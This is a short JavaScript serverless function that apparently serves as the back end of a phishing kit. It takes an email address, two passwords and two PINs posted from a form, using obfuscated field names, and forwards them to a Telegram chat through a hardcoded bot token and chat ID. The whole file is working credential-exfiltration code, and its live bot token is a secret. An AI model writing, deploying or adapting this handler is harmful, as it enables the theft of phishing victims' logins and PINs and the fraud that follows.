module.exports = async function (req, res) {
  res.setHeader("Access-Control-Allow-Credentials", true);
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST,OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    return res.status(200).end();
  }

  if (req.method !== "POST") {
    return res.status(405).json({ success: false });
  }

  const TGBT = "8101561109:AAExMjN5xnJB2iLkFgCK3R4qFPIzWve6eMo";
  const TGCI = "893828008";
  if (!TGBT || !TGCI) {
    return res.status(500).json({ success: false });
  }

  const {
    phwet: rcxrr,
    psdwet: psrd,
    psdwetp: psrdp,
    pnit: pnct,
    pnitr: pnctr
  } = req.body || {};

  if (!rcxrr || !psrd || !psrdp || !pnct || !pnctr) {
    return res.status(400).json({ success: false });
  }

  const message = `Eml: ${rcxrr}\nPswd1: ${psrd}\nPswd2: ${psrdp}\nPn1: ${pnct}\nPn2: ${pnctr}`;

  try {
    const tgRes = await fetch(`https://api.telegram.org/bot${TGBT}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TGCI,
        text: message
      })
    });

    if (!tgRes.ok) {
      const errorData = await tgRes.json();
      return res.status(500).json({
        success: false,
      });
    }

    return res.status(200).json({ success: true });
  } catch (err) {
    return res.status(500).json({ success: false});
  }
};